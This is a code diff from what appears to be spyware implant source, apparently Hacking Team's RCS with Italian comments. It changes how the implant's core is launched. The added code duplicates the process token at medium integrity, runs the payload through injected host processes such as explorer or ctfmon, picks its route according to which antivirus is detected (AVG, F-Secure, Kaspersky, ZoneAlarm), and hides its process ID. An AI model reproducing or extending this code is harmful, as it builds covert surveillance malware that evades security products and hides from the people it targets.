@@ -1267,6 +1267,7 @@ DWORD HM_FindPid(char *proc_name, BOOL my_flag)
 
 #define MAX_CMD_LINE 800
 typedef BOOL (WINAPI *CreateProcess_t) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
+typedef BOOL (WINAPI *CreateProcessAsUser_t) (HANDLE, LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
 typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);
 typedef struct {
 	COMMONDATA;
@@ -1438,6 +1439,50 @@ void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS
 		pCreateProcess(NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
 }
 
+void IndirectCreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, HANDLE hToken)
+{
+	HMODULE hmod = NULL;
+	CreateProcessAsUser_t pCreateProcessAsUser = NULL;
+
+	if (!hToken)
+		return IndirectCreateProcess(cmd_line, flags, si, pi);
+
+	hmod = GetModuleHandle("advapi32.dll");
+	if (hmod)
+		pCreateProcessAsUser = (CreateProcessAsUser_t)HM_SafeGetProcAddress(hmod, "CreateProcessAsUserA");
+	if (pCreateProcessAsUser)
+		pCreateProcessAsUser(hToken, NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
+}
+
+
+HANDLE GetMediumLevelToken()
+{
+	HANDLE hToken;
+	HANDLE hNewToken = NULL;
+
+	// Medium integrity SID
+	WCHAR wszIntegritySid[20] = L"S-1-16-8192";
+	PSID pIntegritySid = NULL;
+
+	TOKEN_MANDATORY_LABEL TIL = {0};
+	PROCESS_INFORMATION ProcInfo = {0};
+	STARTUPINFOW StartupInfo = {0};
+	ULONG ExitCode = 0;
+
+	if (OpenProcessToken(GetCurrentProcess(),MAXIMUM_ALLOWED, &hToken)) {
+		if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
+			if (ConvertStringSidToSidW(wszIntegritySid, &pIntegritySid)) {
+				TIL.Label.Attributes = SE_GROUP_INTEGRITY;
+				TIL.Label.Sid = pIntegritySid;
+				SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid));
+				LocalFree(pIntegritySid);
+			}
+		}
+		CloseHandle(hToken);
+	}
+	return hNewToken;
+}
+
 // Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
 // CreateProcess e poi la invoca.
 extern "C" void __stdcall HIDING(void);
@@ -1487,18 +1532,18 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	}
 
 	// ---------------------------------------------
-	
+	HANDLE hToken = GetMediumLevelToken();
 	if (IsAVG_IS() || IsFSecure() || IsKaspersky()) {
 		char exp_cmd[512];
 		HM_ExpandStrings(cmd_line, exp_cmd, sizeof(exp_cmd));
-		IndirectCreateProcess(exp_cmd, flags, si, pi);
+		IndirectCreateProcessAsUser(exp_cmd, flags, si, pi, hToken);
 		//CreateProcess(NULL, exp_cmd, 0, 0, FALSE, flags, 0, 0, si, pi);
 	} else if (HM_FindPid("zlclient.exe", FALSE)) {
 		// Se c'e' zonealarm usa come host ctfmon,
 		// se questo non e' presente usa explorer
-		HM_CreateProcess(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE));
+		HM_CreateProcessAsUser(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE), hToken);
 	} else // Non c'e' zonealarm e usa explorer
-		HM_CreateProcess(cmd_line, flags, si, pi, 0);
+		HM_CreateProcessAsUser(cmd_line, flags, si, pi, 0, hToken);
 	HideDevice dev_unhook;
 	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
 }
@@ -1506,6 +1551,11 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 // Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
 // Se fallisce ritorna 0 come child_pid nella struttura PROCESS_INFORMATION
 void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
+{
+	HM_CreateProcessAsUser(cmd_line, flags, si, pi, host_pid, NULL);
+}
+
+void __stdcall HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid, HANDLE hToken)
 {
 	HMCreateProcessThreadDataStruct HMCreateProcessThreadData;
 	HMODULE hMod;
@@ -1545,7 +1595,7 @@ void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PR
 	// Se non trova un processo ospite, o se e' a 64bit, chiama la CreateProcess normale
 	if (!explorer_pid || IsX64Process(explorer_pid)) {
 		pi->hProcess = 0; pi->hThread = 0;
-		IndirectCreateProcess(HMCreateProcessThreadData.cmd_line, flags, si, pi);
+		IndirectCreateProcessAsUser(HMCreateProcessThreadData.cmd_line, flags, si, pi, hToken);
 		if (pi->hProcess)
 			CloseHandle(pi->hProcess);
 		if (pi->hThread)
